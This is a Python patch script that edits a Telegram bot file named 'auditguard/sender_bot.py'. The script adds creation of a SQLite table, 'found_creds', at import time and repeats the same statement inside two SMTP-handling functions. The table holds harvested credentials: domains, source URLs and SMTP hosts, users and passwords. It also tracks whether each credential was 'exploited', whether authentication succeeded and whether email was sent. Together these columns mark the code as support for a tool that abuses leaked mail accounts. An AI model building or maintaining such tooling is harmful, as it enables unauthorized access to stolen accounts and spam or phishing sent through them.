import re

with open("auditguard/sender_bot.py", "r") as f:
    content = f.read()

# 1. Add DB init function before def _allowed
db_init_code = '''
# ---------------------------------------------------------------------------
# Ensure DB schema exists (found_creds table)
# ---------------------------------------------------------------------------
def _ensure_db_schema():
    """Create found_creds table if it does not exist."""
    import sqlite3 as _sql
    _db = _sql.connect(DB_PATH, timeout=10)
    _db.executescript("""
        CREATE TABLE IF NOT EXISTS found_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
            source_url TEXT, source_type TEXT, context TEXT,
            smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
            found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
            auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
            exploit_error TEXT, notified INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_creds_domain ON found_creds(domain);
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
    """)
    _db.commit()
    _db.close()

# Run schema init at import time
_ensure_db_schema()

'''

content = content.replace(
    "def _allowed(update: Update) -> bool:",
    db_init_code + "def _allowed(update: Update) -> bool:",
    1
)

# 2. In _add_manual_smtp, add table creation safety net after db.row_factory line
old_str = '    db.row_factory = sqlite3.Row\n    host = smtp_data["host"]'

ensure_table = '''    db.row_factory = sqlite3.Row
    # Ensure table exists (safety net)
    db.execute("""CREATE TABLE IF NOT EXISTS found_creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
        source_url TEXT, source_type TEXT, context TEXT,
        smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
        found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
        auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
        exploit_error TEXT, notified INTEGER DEFAULT 0
    )""")
    db.commit()
    host = smtp_data["host"]'''

content = content.replace(old_str, ensure_table, 1)

# 3. In _get_all_smtp, add table creation after db.row_factory
old_get = '''        db.row_factory = sqlite3.Row
        rows = db.execute(
            """SELECT id, domain, provider, smtp_host, smtp_port, 
                      smtp_user, smtp_password, auth_ok, email_sent,
                      found_at, source_type
               FROM found_creds'''

new_get = '''        db.row_factory = sqlite3.Row
        # Ensure table exists
        db.execute("""CREATE TABLE IF NOT EXISTS found_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
            source_url TEXT, source_type TEXT, context TEXT,
            smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
            found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
            auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
            exploit_error TEXT, notified INTEGER DEFAULT 0
        )""")
        rows = db.execute(
            """SELECT id, domain, provider, smtp_host, smtp_port, 
                      smtp_user, smtp_password, auth_ok, email_sent,
                      found_at, source_type
               FROM found_creds'''

content = content.replace(old_get, new_get, 1)

with open("auditguard/sender_bot.py", "w") as f:
    f.write(content)

print("PATCHED OK")
